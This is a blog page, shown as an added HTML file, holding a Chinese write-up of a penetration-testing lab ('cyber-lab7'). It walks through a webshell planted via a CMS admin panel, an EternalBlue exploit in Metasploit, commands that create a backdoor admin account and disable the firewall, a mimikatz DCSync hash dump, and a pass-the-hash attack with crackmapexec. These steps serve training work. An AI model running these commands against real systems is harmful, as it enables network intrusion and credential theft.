@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" lab7 精简思路\n1 依旧是10主机先拿设立了，发现2个内网主机40与20，40打永恒之蓝然后再创建用户，发现其是域控机子，直接pth打20主机 bagecms-rce 扫c段没扫出啥，直接对10主机扫端口，扫出一个cms\n1 /index.php?r=admini/public/login 进入后台admin/admin123456登入,然后模板编辑写马进去\n">
+<title>cyber-lab7</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/cyber-lab7/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="cyber-lab7">
+<meta property='og:description' content=" lab7 精简思路\n1 依旧是10主机先拿设立了，发现2个内网主机40与20，40打永恒之蓝然后再创建用户，发现其是域控机子，直接pth打20主机 bagecms-rce 扫c段没扫出啥，直接对10主机扫端口，扫出一个cms\n1 /index.php?r=admini/public/login 进入后台admin/admin123456登入,然后模板编辑写马进去\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/cyber-lab7/'>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2026-01-14T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-14T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="cyber-lab7">
+<meta name="twitter:description" content=" lab7 精简思路\n1 依旧是10主机先拿设立了，发现2个内网主机40与20，40打永恒之蓝然后再创建用户，发现其是域控机子，直接pth打20主机 bagecms-rce 扫c段没扫出啥，直接对10主机扫端口，扫出一个cms\n1 /index.php?r=admini/public/login 进入后台admin/admin123456登入,然后模板编辑写马进去\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#bagecms-rce">bagecms-rce</a></li>
+    <li><a href="#永恒之蓝">永恒之蓝</a></li>
+    <li><a href="#pth">PTH</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" style="background-color: #00ff00; color: #fff;">
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/cyber-lab7/">cyber-lab7</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-01-14</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="lab7">lab7
+</h1><p>精简思路</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">依旧是10主机先拿设立了，发现2个内网主机40与20，40打永恒之蓝然后再创建用户，发现其是域控机子，直接pth打20主机
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="bagecms-rce">bagecms-rce
+</h2><p>扫c段没扫出啥，直接对10主机扫端口，扫出一个cms</p>
+<p><img src="/p/cyber-lab7/image-20260114113918692.png"
+	width="1352"
+	height="457"
+	srcset="/p/cyber-lab7/image-20260114113918692_hu_3a80387df04429e0.png 480w, /p/cyber-lab7/image-20260114113918692_hu_75dd541b4fbb0ab0.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114113918692"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="295"
+		data-flex-basis="710px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/index.php?r=admini/public/login
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进入后台admin/admin123456登入,然后模板编辑写马进去</p>
+<p><img src="/p/cyber-lab7/image-20260114115945077.png"
+	width="977"
+	height="521"
+	srcset="/p/cyber-lab7/image-20260114115945077_hu_8346856473148ee4.png 480w, /p/cyber-lab7/image-20260114115945077_hu_bd44a4411163dd0c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114115945077"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="187"
+		data-flex-basis="450px"
+	
+></p>
+<p><img src="/p/cyber-lab7/image-20260114120203803.png"
+	width="305"
+	height="109"
+	srcset="/p/cyber-lab7/image-20260114120203803_hu_365a812f57240ec.png 480w, /p/cyber-lab7/image-20260114120203803_hu_60113adf33b899ad.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114120203803"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="279"
+		data-flex-basis="671px"
+	
+></p>
+<h2 id="永恒之蓝">永恒之蓝
+</h2><p>ipconfig发现又内网，上传fscan扫，发现20与40主机，40主机有永恒之蓝</p>
+<p><img src="/p/cyber-lab7/image-20260114120642283.png"
+	width="1317"
+	height="363"
+	srcset="/p/cyber-lab7/image-20260114120642283_hu_1397b2babbd09836.png 480w, /p/cyber-lab7/image-20260114120642283_hu_29eea5cd0eeaa09c.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114120642283"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="362"
+		data-flex-basis="870px"
+	
+></p>
+<p>先打40主机</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo openvpn --config cyberstrikelab.com-lab7.ovpn --keepalive 10 60 --route-nopull --route 192.168.10.0 255.255.255.0 &amp;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./linux_x64_admin -l 172.16.233.2:8000 -s 123
+</span></span><span class="line"><span class="cl">win_agent.exe -c 172.16.233.2:8000 -s 123 --reconnect 8
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">proxychains4</span>  <span class="n">msfconsole</span>
+</span></span><span class="line"><span class="cl"><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">ms17_010_command</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">RHOSTS</span> <span class="mf">192.168.20.40</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> <span class="n">COMMAND</span> <span class="nb">type</span> <span class="n">C</span><span class="p">:</span>\\<span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">run</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab7/image-20260114140844302.png"
+	width="878"
+	height="459"
+	srcset="/p/cyber-lab7/image-20260114140844302_hu_b0b30c93add7134b.png 480w, /p/cyber-lab7/image-20260114140844302_hu_17428e6425241cbc.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114140844302"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="191"
+		data-flex-basis="459px"
+	
+></p>
+<h2 id="pth">PTH
+</h2><p>添加一个用户远程登入，这里也给10主机加一个吧</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set COMMAND &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f&#39;
+</span></span><span class="line"><span class="cl">set COMMAND net user xtk 123@abc /add
+</span></span><span class="line"><span class="cl">set COMMAND net localgroup Administrators xtk /add
+</span></span><span class="line"><span class="cl">set COMMAND netsh firewall set opmode disable
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 xfreerdp /u:xtk /p:&#39;123@abc&#39; /v:192.168.20.10 /cert:ignore /tls-seclevel:0 /drive:share,/mnt/xpw/kali_shard
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 xfreerdp /u:xtk /p:&#39;123@abc&#39; /v:192.168.20.40 /cert:ignore /tls-seclevel:0 /drive:share,/mnt/xpw/kali_shard
+</span></span><span class="line"><span class="cl">#/tls-seclevel:0 参数，降低安全验证等级，允许连接旧系统。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>登入后打<code>net group &quot;Domain Controllers&quot; /domain</code>发现是域控服务器，那就是打哈希传递</p>
+<p><img src="/p/cyber-lab7/image-20260114141619960.png"
+	width="498"
+	height="173"
+	srcset="/p/cyber-lab7/image-20260114141619960_hu_828369d5bb14bc9f.png 480w, /p/cyber-lab7/image-20260114141619960_hu_b922c3ec66cf15da.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114141619960"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="287"
+		data-flex-basis="690px"
+	
+></p>
+<p>上传猕猴桃，当然也同时可以上线cs，试试！改一下java版本，之前换成java8了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo update-alternatives --config java
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后上线</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">./teamserver 172.16.233.2 111111
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>转发cs就是上不了？那手打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">privilege::debug
+</span></span><span class="line"><span class="cl">lsadump::dcsync /domain:cyberstrikelab.com /all
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab7/image-20260114151025092.png"
+	width="542"
+	height="190"
+	srcset="/p/cyber-lab7/image-20260114151025092_hu_2ffd3ebb250a7c9f.png 480w, /p/cyber-lab7/image-20260114151025092_hu_969c7451d0a764f0.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114151025092"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="285"
+		data-flex-basis="684px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">d8174fc8c5ee7a8e460df2e61d00bd3c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 crackmapexec smb 192.168.20.20 -u administrator -H d8174fc8c5ee7a8e460df2e61d00bd3c  -d cyberstrikelab.com -x &#34;type C:\\flag.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/cyber-lab7/image-20260114151149756.png"
+	width="1524"
+	height="416"
+	srcset="/p/cyber-lab7/image-20260114151149756_hu_78ab313df122a5a3.png 480w, /p/cyber-lab7/image-20260114151149756_hu_9357465f61a0c26f.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260114151149756"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="366"
+		data-flex-basis="879px"
+	
+></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cyber-lab8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab8</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab6</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab4/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab5</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab2/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab2</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <script src="https://utteranc.es/client.js" 
+        repo=""
+        issue-term="pathname"
+        
+        crossorigin="anonymous"
+        async
+        >
+</script>
+
+<style>
+    .utterances {
+        max-width: unset;
+    }
+</style>
+
+<script>
+    let utterancesLoaded = false;
+
+    function setUtterancesTheme(theme) {
+        let utterances = document.querySelector('.utterances iframe');
+        if (utterances) {
+            utterances.contentWindow.postMessage(
+                {
+                    type: 'set-theme',
+                    theme: `github-${theme}`
+                },
+                'https://utteranc.es'
+            );
+        }
+    }
+
+    addEventListener('message', event => {
+        if (event.origin !== 'https://utteranc.es') return;
+
+        
+        utterancesLoaded = true;
+        setUtterancesTheme(document.documentElement.dataset.scheme)
+    });
+
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (!utterancesLoaded) return;
+        setUtterancesTheme(e.detail)
+    })
+</script>
+
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 luokaihong
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
